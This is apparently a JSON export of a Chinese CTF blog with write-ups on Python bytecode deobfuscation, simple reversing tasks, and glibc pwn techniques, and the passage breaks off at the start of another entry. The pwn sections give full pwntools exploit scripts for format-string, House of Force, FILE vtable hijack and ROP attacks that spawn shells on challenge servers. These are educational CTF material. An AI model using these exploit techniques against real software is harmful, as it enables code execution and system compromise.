{"meta":{"title":"Chumen77's Blog","subtitle":"永远相信美好的事情即将发生！","description":null,"author":"chumen77","url":"http://chumen77.xyz","root":"/"},"pages":[],"posts":[{"title":"DASCTF安恒月赛(6th)","slug":"DASCTF安恒月赛(6th)","date":"2020-06-27T14:27:37.170Z","updated":"2020-06-28T01:01:00.498Z","comments":true,"path":"2020/06/27/DASCTF安恒月赛(6th)/","link":"","permalink":"http://chumen77.xyz/2020/06/27/DASCTF安恒月赛(6th)/","excerpt":"","text":"DASCTF安恒月赛(6th)REpyCharm(pyc文件恢复)这个题基本参考https://www.52pojie.cn/thread-912103-1-1.html来做的。 加载pyc co_codeIn [1]: import dis,marshal In [2]: f=open(&#39;1.pyc&#39;) In [3]: f.read(4) Out[3]: &#39;\\x03\\xf3\\r\\n&#39; In [4]: f.read(4) Out[4]: &#39;jv\\xe7^&#39; In [5]: code = marshal.load(f) In [6]: code.co_consts Out[6]: (-1, None, &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39;, &#39;Are u ready?&#39;, 0, 32, &#39;a&#39;, &#39;&#39;, &#39;great!waht u input is the flag u wanna get.&#39;, &#39;pity!&#39;) In [7]: code.co_varnames Out[7]: () In [8]: code.co_names Out[8]: (&#39;base64&#39;, &#39;a&#39;, &#39;raw_input&#39;, &#39;flag&#39;, &#39;b64encode&#39;, &#39;c&#39;, &#39;list&#39;, &#39;d&#39;, &#39;range&#39;, &#39;i&#39;, &#39;join&#39;, &#39;ohh&#39;) In [9]: code.co_code Out[9]: &quot;q\\x03\\x00q\\x00\\x06d\\xffd\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00d\\x02\\x00Z\\x01\\x00e\\x02\\x00d\\x03\\x00\\x83\\x01\\x00Z\\x03\\x00e\\x00\\x00j\\x04\\x00e\\x03\\x00\\x83\\x01\\x00Z\\x05\\x00e\\x06\\x00e\\x05\\x00\\x83\\x01\\x00Z\\x07\\x00x&#39;\\x00e\\x08\\x00d\\x04\\x00d\\x05\\x00\\x83\\x02\\x00D]\\x16\\x00Z\\t\\x00e\\x07\\x00e\\t\\x00c\\x02\\x00\\x19d\\x06\\x007\\x03&lt;qI\\x00Wd\\x07\\x00j\\n\\x00e\\x07\\x00\\x83\\x01\\x00Z\\x0b\\x00e\\x0b\\x00e\\x01\\x00k\\x02\\x00r\\x86\\x00d\\x08\\x00GHn\\x05\\x00d\\t\\x00GHd\\x01\\x00S&quot;使用dis库对co_code进行反编译:In [10]: dis.dis(code.co_code) 0 JUMP_ABSOLUTE 3 &gt;&gt; 3 JUMP_ABSOLUTE 1536 6 LOAD_CONST 25855 (25855) 9 STOP_CODE 10 STOP_CODE 11 LOAD_CONST 1 (1) 14 IMPORT_NAME 0 (0) 17 STORE_NAME 0 (0) 20 LOAD_CONST 2 (2) 23 STORE_NAME 1 (1) 26 LOAD_NAME 2 (2) 29 LOAD_CONST 3 (3) 32 CALL_FUNCTION 1 35 STORE_NAME 3 (3) 38 LOAD_NAME 0 (0) 41 LOAD_ATTR 4 (4) 44 LOAD_NAME 3 (3) 47 CALL_FUNCTION 1 50 STORE_NAME 5 (5) 53 LOAD_NAME 6 (6) 56 LOAD_NAME 5 (5) 59 CALL_FUNCTION 1 62 STORE_NAME 7 (7) 65 SETUP_LOOP 39 (to 107) 68 LOAD_NAME 8 (8) 71 LOAD_CONST 4 (4) 74 LOAD_CONST 5 (5) 77 CALL_FUNCTION 2 80 GET_ITER 81 FOR_ITER 22 (to 106) 84 STORE_NAME 9 (9) 87 LOAD_NAME 7 (7) 90 LOAD_NAME 9 (9) 93 DUP_TOPX 2 96 BINARY_SUBSCR 97 LOAD_CONST 6 (6) 100 INPLACE_ADD 101 ROT_THREE 102 STORE_SUBSCR 103 JUMP_ABSOLUTE 73 &gt;&gt; 106 POP_BLOCK &gt;&gt; 107 LOAD_CONST 7 (7) 110 LOAD_ATTR 10 (10) 113 LOAD_NAME 7 (7) 116 CALL_FUNCTION 1 119 STORE_NAME 11 (11) 122 LOAD_NAME 11 (11) 125 LOAD_NAME 1 (1) 128 COMPARE_OP 2 (==) 131 POP_JUMP_IF_FALSE 134 &gt;&gt; 134 LOAD_CONST 8 (8) 137 PRINT_ITEM 138 PRINT_NEWLINE 139 JUMP_FORWARD 5 (to 147) 142 LOAD_CONST 9 (9) 145 PRINT_ITEM 146 PRINT_NEWLINE &gt;&gt; 147 LOAD_CONST 1 (1) 150 RETURN_VALUE这里面需要注意的就是开头的： 0 JUMP_ABSOLUTE 3 &gt;&gt; 3 JUMP_ABSOLUTE 1536 6 LOAD_CONST 25855 (25855) 9 STOP_CODE 10 STOP_CODE明显加入了混淆，怎么突然就停止了STOP_CODE。接着就是想办法去除这些混淆，和修正co_code长度，期望修改后的opcode首行为 0 LOAD_CONST 0(0) 1 LOAD_CONST 1(1)其中这种二进制字节码对应的翻译结果： 0x64 操作为LOAD_CONST，用法举例：LOAD_CONST 1 HEX: 640100 0x71 操作为JUMP_ABSOLUTE，用法举例：JUMP_ABSOLUTE 14 HEX: 710e00 0x65 操作为LOAD_NAME，用法举例：LOAD_NAME 1 HEX: 650100 0x71 操作为LOAD_NAME，所以寻找： 0 LOAD_CONST 0(0)即为寻找HEX : 640000这个作为混淆字段结束。开头怎么寻找呢。由于看前面3个字节对应一个含义，猜测： 0 JUMP_ABSOLUTE 3￼￼￼￼￼￼￼￼￼ 那很明显混淆字段就是： 然后用工具删除即可，其中0x97就是co_code In [12]: len(code.co_code) Out[12]: 151 In [13]: hex(151) Out[13]: &#39;0x97&#39;所以去除这8个字节的混淆代码，然后修改co_code长度为0x8f。 还原后的pyc开头 反编译反编译方法就多种多样了，可以在线什么的，我使用的uncompyle6. uncompyle6 -o 1.py 1.pyc# uncompyle6 version 3.7.1 # Python bytecode 2.7 (62211) # Decompiled from: Python 2.7.16 (default, Feb 29 2020, 01:55:37) # [GCC 4.2.1 Compatible Apple LLVM 11.0.3 (clang-1103.0.29.20) (-macos10.15-objc- # Embedded file name: pyCharm.py # Compiled at: 2020-06-15 21:23:54 import base64 a = &#39;YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=&#39; flag = raw_input(&#39;Are u ready?&#39;) c = base64.b64encode(flag) d = list(c) for i in range(0, 32): d[i] += &#39;a&#39; ohh = (&#39;&#39;).join(d) if ohh == a: print &#39;great!waht u input is the flag u wanna get.&#39; else: print &#39;pity!&#39;%反编译后这题就十分简单了。 给的字符串把“a”，去除后解码base64即可。 easy_maze直接去hex下提取迷宫，由于是100个字符，很容易联想到是10x10的迷宫。然后丢vscode。直接路径就出来了。 jkkjjhjjkjjkkkuukukkuuhhhuukkkMd5一下即可。 T0p Gear题目不难，太菜了，看c++有点头大，做的有点慢。Ida动态调试，一共3个check，都是断在Strcmp。每次随便输入，然后分析和获取rdi，rsi寄存器对应地址处的字符串。拿到以后，3个拼接一下就是flag。 pwnspringboard考点就是堆上的格式化字符串利用，挺简单的。 攻击思路 利用环境变量那条链，进行攻击ret address，修改为one gadget给了8次漏洞利用机会，还是很容易实现的。其中ret address，为__libc_start_main+xxx EXPfrom pwn import * import time local_file = &#39;./springboard&#39; local_libc = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39; remote_libc = local_libc # &#39;../libc.so.6 context.log_level = &#39;debug&#39; debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote(&#39;183.129.189.60&#39;,10029) libc = ELF(remote_libc) elf = ELF(local_file) # libc = elf.libc context.arch = elf.arch context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39; rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, &#39;\\0&#39;)) uu64 = lambda data :u64(data.ljust(8, &#39;\\0&#39;)) info_addr = lambda tag, addr :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;) gdb.attach(io) pause() sla(&quot;input&quot;,&quot;1&quot;) sla(&quot;input&quot;,&quot;2&quot;) sla(&quot;input&quot;,&quot;3&quot;) sla(&quot;input&quot;,&quot;%13$pAAAA%11$p&quot;) sleep(0.1) ru(&quot;0x&quot;) tag = int(r(12),16) - 0xe0 ru(&quot;AAAA0x&quot;) libc_base = int(r(12),16) -0x21b97 info_addr(&quot;libc_base&quot;,libc_base) key1 = hex(tag)[-4:] print(key1) payload = &#39;%{}c%13$hn&#39;.format(int(key1,16)) sla(&quot;input&quot;,payload) sleep(5) rec = rce18[1] + libc_base key2 = hex(rec)[-4:] print(key2) payload = &#39;%{}c%39$hn&#39;.format(int(key2,16)) sla(&quot;input&quot;,payload) sleep(5) key3 = int(hex(tag)[-2:],16) + 2 print(key3) payload = &#39;%{}c%13$hhn&#39;.format(key3) sla(&quot;input&quot;,payload) sleep(5) key4 = hex(rec)[-6:-4] print(key4) payload = &#39;%{}c%39$hhn&#39;.format(int(key4,16)) sla(&quot;input&quot;,payload) itr() # 0000| 0x7fffffffe2f0 --&gt; 0x555555554980 (push r15) # 0008| 0x7fffffffe2f8 --&gt; 0x55554780 # 0016| 0x7fffffffe300 --&gt; 0x555555756010 (&quot;11111111aaaaaaaa1111111122222222\\n&quot;) # 0024| 0x7fffffffe308 --&gt; 0x84fa9f2a7e35ae00 # 0032| 0x7fffffffe310 --&gt; 0x555555554980 (push r15) # 0040| 0x7fffffffe318 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;: mov edi,eax) # 0048| 0x7fffffffe320 --&gt; 0x1 # 0056| 0x7fffffffe328 --&gt; 0x7fffffffe3f8 --&gt; 0x7fffffffe67a (&quot;/media/psf/mypwn/ahys/6/springboard/springboard&quot;) # 0064| 0x7fffffffe330 --&gt; 0x1f7ffcca0 # 0072| 0x7fffffffe338 --&gt; 0x55555555488a (push rbp) # 0080| 0x7fffffffe340 --&gt; 0x0 # 0088| 0x7fffffffe348 --&gt; 0x6e8193b15e1baa42 # 0096| 0x7fffffffe350 --&gt; 0x555555554780 (xor ebp,ebp) # 0104| 0x7fffffffe358 --&gt; 0x7fffffffe3f0 --&gt; 0x1 # 0112| 0x7fffffffe360 --&gt; 0x0 # 0120| 0x7fffffffe368 --&gt; 0x0 # 0128| 0x7fffffffe370 --&gt; 0x3bd4c6e40b5baa42 # 0136| 0x7fffffffe378 --&gt; 0x3bd4d65e62cbaa42 # 0144| 0x7fffffffe380 --&gt; 0x0 # 0152| 0x7fffffffe388 --&gt; 0x0 # 0040| 0x7ffe4f08d2d8 --&gt; 0x7f2169b2a830 secret考点就是IO_FILE的相关知识了，是针对伪造 vtable 劫持程序流程。 这个题估计是参考https://xz.aliyun.com/t/7205这个题出的，但是文中的题比这个要难多了。（ps：感谢出题人手下留情） fclose 函数调用的 vtable 函数 vtable 函数 指针： /* The &#39;finish&#39; function does any final cleaning up of an _IO_FILE object. It does not delete (free) it, but does everything else to finalize it. It matches the streambuf::~streambuf virtual destructor. */ typedef void (*_IO_finish_t) (FILE *, int); /* finalize */ #define _IO_FINISH(FP) JUMP1 (__finish, FP, 0) #define _IO_WFINISH(FP) WJUMP1 (__finish, FP, 0) struct _IO_jump_t { JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue); };对于攻击的vtable 函数 指针其中的： __finish__ __close 其执行顺序是先close，然后finish。由于程序给的是0x18字节的任意写，攻击 __finish__就可以了。 libc2.29中的vtablevtable的值，以及其对应的函数指针，在glibc 2.29下是可写的。这个是很重要的一点，本来个人不知道这个，想了好久其他的办法来利用。 在glibc 2.23以及glibc 2.27其都是不可写的。 正是因为可以写，所以这个题难度就降低了很多。 攻击思路利用程序的最后一次任意地址写，直接把__IO_2_1_stderr的vtable上__finish__指针修改为one gadget。（这里的one gadget，需要自己多试）。 小tips第2次的2字节读入可以直接用其本来地址末2字节即可，直接在__IO_2_1_stderr的vtable不用转移也可以的。（看到有别的师傅转移到其他vtable地址的。）并且，由于是read函数，直接发个\\x60一个字节即可。 expfrom pwn import * import time local_file = &#39;./secret&#39; local_libc = &#39;/usr/lib/x86_64-linux-gnu/libc-2.29.so&#39; remote_libc = &#39;./libc6_2.29-0ubuntu2_amd64.so&#39; context.log_level = &#39;debug&#39; debug = 0 if debug: io = process(local_file) libc = ELF(local_libc) else: io = remote(&#39;183.129.189.60&#39;,10030) libc = ELF(remote_libc) elf = ELF(local_file) # libc = elf.libc context.arch = elf.arch context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39; rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, &#39;\\0&#39;)) uu64 = lambda data :u64(data.ljust(8, &#39;\\0&#39;)) info_addr = lambda tag, addr :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;) gdb.attach(io) pause() ru(&quot;0x&quot;) libc_base = int(r(12),16) - libc.symbols[&quot;printf&quot;] info_addr(&quot;libc_base&quot;,libc_base) ru(&quot;addr&quot;) vtable = 0x1e5758 + libc_base s(p64(vtable)) sleep(0.1) # debug() s(&#39;\\x60&#39;) sleep(0.1) rec = 0xe2386 + libc_base s(p64(0) + p64(0)+p64(rec)) itr() 由于提前就fclose(stdout),getshell以后也不会有任何的输出，所以得用exec 1&gt;&amp;2来恢复输出。","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"}]},{"title":"House of Force","slug":"House of Force","date":"2020-05-13T13:30:55.952Z","updated":"2020-06-27T16:24:45.106Z","comments":true,"path":"2020/05/13/House of Force/","link":"","permalink":"http://chumen77.xyz/2020/05/13/House of Force/","excerpt":"","text":"House of Force前言基本按照这wiki上面学的，简单记录一下。 原理 使用条件 能够以溢出等方式控制到 top chunk 的 size 域 能够自由地控制堆分配尺寸的大小产生原因House Of Force 产生的原因在于 glibc 对 top chunk 的处理：进行堆分配时,如果所有空闲的块都无法满足需求,那么就会从 top chunk 中分割出相应的大小作为堆块的空间。 所以当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么?答案是,可以使得 top chunk指向我们期望的任何位置,这就相当于一次任意地址写。 // 获取当前的top chunk，并计算其对应的大小 victim = av-&gt;top; size = chunksize(victim); // 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。 if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); av-&gt;top = remainder; set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; }所以，如果可以篡改 size 为一个很大值,就可以轻松的通过这个验证,这也就是我们前面说的需要一个能够控制top chunk size 域的漏洞。 一般的利用办法 remainder = chunk_at_offset(victim, nb); av-&gt;top = remainder; /* Treat space at ptr + offset as a chunk */ #define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))之后这里会把 top chunk的 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值(write-anything-anywhere)。 简单实例让top chunk 的指针减小来修改位于其上面(低地址) 的got表中的内容这个核心就是来缩小top chunk 的指针，来修改位于其上面(低地址) 的某处中的内容。这里可能是heap的指针，got表。 这其中有个难缠的问题就是结构体对齐问题，目前我所练习到的题遇到这个问题的都是，减去一下SIZE_SZ（64位是8 ，32位是4）。 让那个top chunk 指针增大来修改位于高地址空间的内容这个是较好理解的，常用修改libc上面某处的地址。 hitcon-training-bamboobox主要是修改一下，开始程序自动创建的存放2个函数指针的堆，其中hello-message用于程序开始时使用，goodbye-message 用于在程序结束时使用。 利用思路： 添加堆块，利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。 利用 house of force 技巧，分配 chunk 至堆的基地址。 覆盖 goodbye-message 为magic 函数地址来控制程序执行流。expfrom pwn import * import time local_file = &#39;./bamboobox&#39; local_libc = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39; remote_libc = local_libc # &#39;../libc.so.6 debug = 1 if debug: io = process(local_file) context.log_level = &#39;debug&#39; libc = ELF(local_libc) else: io = remote(&#39;node3.buuoj.cn&#39;,25784) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.arch = elf.arch context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39; s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, &#39;\\0&#39;)) uu64 = lambda data :u64(data.ljust(8, &#39;\\0&#39;)) info_addr = lambda tag, addr :io.info(tag + &#39;: {:#x}&#39;.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;) gdb.attach(io) pause() def add(size,content): sla(‘choice’,’2’) sla(‘item name:’,str(size)) sa(‘item’,str(content)) def free(id): sla(‘choice’,’4’) sla(‘item’,str(id)) def show(id): sla(‘choice’,’1’) def edit(id,size,content): sla(‘choice’,’3’) sla(‘item’,str(id)) sla(‘item name’,str(size)) sa(‘item’,str(content)) context.log_level = ‘debug’magic = 0x400d49add(0x30,’chum’)payload = ‘a’ * 0x30 +p64(0) + p64(0xffffffffffffffff)edit(0,0x40,payload)size = -(0x40 + 0x20) - 0x10add(size,’ ‘)payload = p64(0x400d49) + p64(0x400d49)add(0x10,payload) sla(‘choice:’,’5’)itr() ## gyctf-2020-force ### ida分析 ![][image-5] 可以实现堆溢出。并且在你申请一个堆块以后，程序会给你打印出堆块的地址，这样就可以泄露出信息。 ### 利用思路 - 申请一个很大堆，然后程序会mmap开启一个堆块，此时就可以泄漏出libc的地址。 - HOF - `__malloc_hook` + one gadget ### exp from pwn import *import timelocal_libc = ‘/lib/x86_64-linux-gnu/libc.so.6’local_file = ‘./gyctf_2020_force’remote_libc = local_libc # ‘../libc.so.6debug = 0if debug: io = process(local_file) context.log_level = ‘debug’ libc = ELF(local_libc)else: io = remote(‘node3.buuoj.cn’,29457) libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [‘tmux’,’neww’]#,’’splitw’,’-h’rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(delim, data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(delim, data)sea = lambda delim,data :io.sendafter(delim, data)r = lambda numb=4096 :io.recv(numb)ru = lambda delims, drop=True :io.recvuntil(delims, drop)uu32 = lambda data :u32(data.ljust(4, ‘\\0’))uu64 = lambda data :u64(data.ljust(8, ‘\\0’))info_addr = lambda tag, addr :io.info(tag + ‘==&gt;’ +’: {:#x}’.format(addr))itr = lambda :io.interactive()def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=’b main’) gdb.attach(io) pause() def add(size,date): sla(‘2:puts’,’1’) sla(‘size’,str(size)) ru(‘bin addr 0x’) heapaddr = int(r(12),16) info_addr(‘heapaddr’,heapaddr) sa(‘content’,str(date)) return heapaddrpayload = 0x30 * ‘a’ + p64(0) + p64(0xffffffffffffffff)libc_base = add(0x200000,’111’) + 0x200ff0info_addr(‘libc_base’,libc_base)malloc_hook = libc_base + 0x3c4b10heapaddr = add(0x30,payload)size = malloc_hook-(heapaddr + 0x30) - 0x10 - 0x8 -0x8 -0x8print(‘size—-&gt;’+hex(size))add(size,’a’)rce = rce16[1] + libc_basepayload = p64(0) + p64(rce) + p64(libc_base + libc.symbols[‘__libc_realloc’] + realloc[1])add(0x20,payload)sla(‘2:puts’,’1’)sla(‘size’,’30’) dbg()itr() ## `bcloud_bctf_2016` 这个题是一个十分精妙的题，漏洞出现在程序初始化。 ![][image-6] strcpy是以`\\x00`来判断一个字符串是否结束的。 在栈中，当输入0x40个字符时，因为v2正好在s下面，这就让strcpy从s往v2上面复制时会**把这个堆块的地址也给复制上去**，当其返回name时，也就返回了堆块地址，然后就可以算出堆块的基地址。 ![][image-7] ![][image-8] 到了这个也是这个漏洞，填充完0x40个字符后，会把org堆块的指针和v3里面的内容给复制到org对应的堆块里，也就是0x40 + 4 + len(v3)字节的东西。org在堆块排布中也是最后一个，如果传过去`0xffffffff`,就可以改到top chunk的size位。 ### 利用思路 - leak堆块base - 修改top chunk size - hof到heaplist处 - 给heaplist写上free got，用edit，修改其为puts - 泄漏libc地址 - 修改free got 为system，然后指向`/bin/sh\\x00` ### exp from pwn import *from LibcSearcher import *import timelocal_file = ‘./bcloud_bctf_2016’local_libc = ‘/lib/x86_64-linux-gnu/libc.so.6’remote_libc = local_libc # ‘../libc.so.6debug = 0if debug: io = process(local_file) context.log_level = ‘debug’ libc = ELF(local_libc)else: io = remote(‘node3.buuoj.cn’,27301) libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [‘tmux’,’neww’]#,’’splitw’,’-h’rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(delim, data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(delim, data)sea = lambda delim,data :io.sendafter(delim, data)r = lambda numb=4096 :io.recv(numb)ru = lambda delims, drop=True :io.recvuntil(delims, drop)uu32 = lambda data :u32(data.ljust(4, ‘\\0’))uu64 = lambda data :u64(data.ljust(8, ‘\\0’))info_addr = lambda tag, addr :io.info(tag + ‘==&gt;’ +’: {:#x}’.format(addr))itr = lambda :io.interactive()def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript=’b main’) gdb.attach(io) pause() def name(name): sa(‘name’,str(name)) ru(‘b’) heapbase = uu32(r(4)) - 0x8 info_addr(‘heapbase’,heapbase) return heapbasedef org(org,host): sa(‘Org:’,str(org)) sla(‘Host:’,str(host)) def add(size,content): sla(‘option—&gt;&gt;’,’1’) sla(‘length’,str(size)) sa(‘content:’,str(content)) def edit(id,content): sla(‘—&gt;&gt;’,’3’) sla(‘id’,str(id)) sa(‘the new content’,str(content)) def free(id): sla(‘-&gt;’,’4’) sla(‘id’,str(id)) context.log_level = ‘debug’ sizelist = 0x804B0A0heaplist = 0x804B120heapbase = name(‘a’ * (0x40-1) + ‘b’)top = heapbase + 0xd8info_addr(‘top’,top)org(‘b’*0x40,p32(0xffffffff)) #chang top chunk sizesize = heaplist - top - 0x10add(size,’\\n’)add(0x18,’\\n’)payload = p32(0) + p32(elf.got[‘free’]) + p32(elf.got[‘atoi’]) +p32(0x804B128+4+4) + ‘/bin/sh\\x00’edit(1,payload + ‘\\n’)puts_plt = elf.plt[‘puts’]edit(1,p32(puts_plt) + ‘\\n’)free(2)io.recv(1)io.recv(1)atoi = uu32(r(4))info_addr(‘atoi’,atoi)libc = LibcSearcher(‘atoi’,atoi)libc_base = atoi - libc.dump(‘atoi’)system = libc_base + libc.dump(‘system’)info_addr(‘libc_base’,libc_base)edit(1,p32(system) + ‘\\n’)free(3)itr()```","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"House系列","slug":"House系列","permalink":"http://chumen77.xyz/tags/House系列/"},{"name":"heap","slug":"heap","permalink":"http://chumen77.xyz/tags/heap/"}]},{"title":"DASCTF安恒月赛(4th)","slug":"DASCTF安恒月赛","date":"2020-04-25T13:48:11.966Z","updated":"2020-06-27T16:24:40.675Z","comments":true,"path":"2020/04/25/DASCTF安恒月赛/","link":"","permalink":"http://chumen77.xyz/2020/04/25/DASCTF安恒月赛/","excerpt":"","text":"DASCTF安恒月赛-pwn前言开赛了，有点事情没打，晚上复现了一下。 echo-server[*] &#39;/ctf/work/ahys/echo server/test&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 程序很简单，经典栈溢出，rop利用即可。但是因为是64位的，并且是glibc2.27，发现在做的时候构造rop链总是会cursh，调试发现：发现这段汇编直接会让程序cursh，想起来ex师傅一篇文章分析过，64位程序rop到system拿shell的时候也会这样。但是很奇怪这个也出现了，索性尝试一波。解决办法：还是加个ret，让栈对其即可。 expfrom pwn import * local_file = &#39;./test&#39; local_libc = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39; remote_libc = &#39;./libc.so.6&#39; debug = 1 if debug: io = process(local_file) libc = ELF(local_libc) else: # io = remote(&#39;node3.buuoj.cn&#39;,25390) libc = ELF(remote_libc) elf = ELF(local_file) libc = elf.libc context.log_level = &#39;debug&#39; context.arch = elf.arch context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]#,&#39;neww&#39; s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) sea = lambda delim,data :io.sendafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, &#39;\\0&#39;)) uu64 = lambda data :u64(data.ljust(8, &#39;\\0&#39;)) info_addr = lambda tag, addr :io.info(tag + &#39;: {:#x}&#39;.format(addr)) itr = lambda :io.interactive() def dbg(): # gdb.attach(proc.pidof(io)[0],gdbscript=&quot;b main&quot;) gdb.attach(io) pause() pop_rdi = 0x0000000000400823# : pop rdi ; ret offset = 136 start = 0x4005C0 ret = 0x0400768 sla(&#39;how long is your name:&#39;,&#39;500&#39;) payload = &#39;\\x00&#39; * offset + flat([ret,pop_rdi,elf.got[&#39;read&#39;],elf.plt[&#39;printf&#39;],start]) # dbg() sla(&#39;s you name?&#39;,payload) ru(&#39;hello &#39;) read = uu64(r(6)) info_addr(&#39;printf&#39;,read) libc_base = read - libc.symbols[&#39;read&#39;] info_addr(&#39;libc_base&#39;,libc_base) binsh = libc_base + libc.search(&quot;/bin/sh&quot;).next() system = libc_base + libc.sym[&#39;system&#39;] sla(&#39;how long is your name: &#39;,&#39;500&#39;) payload = &#39;\\x00&#39; * offset + flat([ret,pop_rdi,binsh,system]) # rec = 0x4f322 + libc_base # dbg() sla(&#39;s you name?&#39;,payload) itr() 入门reverses = &#39;akhb~chdaZrdaZudqduvdZvvv|&#39; flag = &#39;&#39; for i in range(26): flag += chr((ord(s[i]) - 1) ^ 6) print(flag) Encrypts直接爆破了。 s = [38,44,33,39,59,35,34,115,117,114,113,33,36,117,118,119,35,120,38,114,117,113,38,34,113,114,117,114,36,112,115,118,121,112,35,37,121,61] for i in range(128): flag = &#39;&#39; for j in range(38): flag += chr(s[j] ^ i) if flag[:4] == &#39;flag&#39;: print(flag)","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"re","slug":"re","permalink":"http://chumen77.xyz/tags/re/"},{"name":"rop","slug":"rop","permalink":"http://chumen77.xyz/tags/rop/"},{"name":"uaf","slug":"uaf","permalink":"http://chumen77.xyz/tags/uaf/"}]},{"title":"uaf和double free","slug":"uaf和double 